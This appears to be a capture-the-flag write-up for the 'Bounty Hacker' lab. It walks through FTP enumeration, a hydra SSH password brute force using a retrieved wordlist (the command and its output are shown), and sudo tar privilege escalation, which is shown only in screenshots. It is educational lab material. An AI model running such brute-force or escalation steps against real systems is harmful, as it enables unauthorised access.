Boot up the machine and enumerate the provided IP address.

NMAP results:

![image](/Bounty%20Hacker/img/Screenshot%202025-06-17%20100750.png)

Visiting FTP first,

![image](/Bounty%20Hacker/img/Screenshot%202025-06-17%20101130.png)

we have 2 text files, copying them to our remote desktop and viewing them.

```bash
└─$ cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-<redacted>
```
Intrestign we now have a username, which we can used for further steps.

```bash
└─$ cat locks.txt 
<redacted>
```
The locks.txt contained a bunch of strings which kind of looked like passwords, let's bruteforce ssh connection 

```bash
└─$ hydra -l <redacted> -P locks.txt <IP> ssh 
Hydra v9.6dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-17 00:51:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.19.58:22/
[22][ssh] host: 10.10.19.58   login: <redacted>   password: <PASSWORD>
1 of 1 target successfully completed, 1 valid password found
```

Bingo we have a hit. Logging in with ssh.

![image](/Bounty%20Hacker/img/Screenshot%202025-06-17%20102446.png)

We have user flag, now to become root.

![image](/Bounty%20Hacker/img/Screenshot%202025-06-17%20102526.png)

The user can execute this command using sudo, checking out privilege escalation with tar.

![image](/Bounty%20Hacker/img/Screenshot%202025-06-17%20102806.png)

Executing this script, lets see what we get.

![image](/Bounty%20Hacker/img/Screenshot%202025-06-17%20102926.png)

Bingooo, we are root and the challeneg has been solved.